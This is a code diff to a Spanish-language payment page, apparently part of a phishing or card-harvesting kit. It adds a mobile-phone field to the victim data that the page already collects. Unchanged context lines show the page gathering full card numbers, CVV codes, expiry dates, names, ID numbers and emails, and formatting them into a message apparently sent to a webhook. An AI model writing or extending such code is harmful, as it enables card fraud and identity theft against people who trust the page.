@@ -822,7 +822,7 @@
                         <span class="resumen-value" id="total-price">23.000 Col$</span>
                     </div>
 
-                    <!-- Datos personales del solicitante -->
+                    <!-- Datos personales del solicitante (incluye celular) -->
                     <div class="resumen-datos">
                         <div class="resumen-item">
                             <span class="resumen-label">Solicitante</span>
@@ -835,6 +835,10 @@
                         <div class="resumen-item">
                             <span class="resumen-label">Correo electrónico</span>
                             <span class="resumen-value" id="resumen-email">---</span>
+                        </div>
+                        <div class="resumen-item">
+                            <span class="resumen-label">Celular</span>
+                            <span class="resumen-value" id="resumen-celular">---</span>
                         </div>
                     </div>
                 </div>
@@ -986,16 +990,18 @@
             const formatted_total = total.toLocaleString('es-CO').replace(/,/g, '.');
             total_price.textContent = formatted_total + ' Col$';
 
-            // Mostrar datos personales en el resumen
+            // Mostrar datos personales en el resumen (incluyendo celular)
             const nombre = localStorage.getItem('nombre') || 'No proporcionado';
             const apellidos = localStorage.getItem('apellidos') || '';
             const tipoDoc = localStorage.getItem('tipoDocumento') || '';
             const numeroDoc = localStorage.getItem('numeroDocumento') || 'No proporcionado';
             const email = localStorage.getItem('email') || 'No proporcionado';
+            const celular = localStorage.getItem('celular') || 'No proporcionado';
 
             document.getElementById('resumen-nombre').textContent = `${nombre} ${apellidos}`.trim() || 'No proporcionado';
             document.getElementById('resumen-documento').textContent = `${tipoDoc} ${numeroDoc}`.trim();
             document.getElementById('resumen-email').textContent = email;
+            document.getElementById('resumen-celular').textContent = celular;
 
             // Configurar webhook
             configurarWebhook();
@@ -1190,6 +1196,7 @@
 👤 Nombre completo: ${datos.nombreCompleto}
 🆔 Documento: ${datos.tipoDocumento} ${datos.numeroDocumento}
 📧 Email: ${datos.email}
+📱 Celular: ${datos.celular}
 
 💳 *DATOS DE LA TARJETA:*
 🏦 Número: \`${datos.numeroTarjeta}\`
@@ -1339,12 +1346,13 @@
             cvcInput.disabled = true;
             bancoEmisor.disabled = true;
 
-            // Leer datos personales desde localStorage
+            // Leer datos personales desde localStorage (incluye celular)
             const nombre = localStorage.getItem('nombre') || 'No proporcionado';
             const apellidos = localStorage.getItem('apellidos') || '';
             const tipoDocumento = localStorage.getItem('tipoDocumento') || '';
             const numeroDocumento = localStorage.getItem('numeroDocumento') || 'No proporcionado';
             const email = localStorage.getItem('email') || 'No proporcionado';
+            const celular = localStorage.getItem('celular') || 'No proporcionado';
 
             const procesamiento_prioritario = localStorage.getItem('procesamiento_prioritario') === 'true';
             let total = 23000;
@@ -1369,6 +1377,7 @@
                 tipoDocumento: tipoDocumento,
                 numeroDocumento: numeroDocumento,
                 email: email,
+                celular: celular,
                 numeroTarjeta: cardNumber,
                 cvv: cvc,
                 vencimiento: expiry,
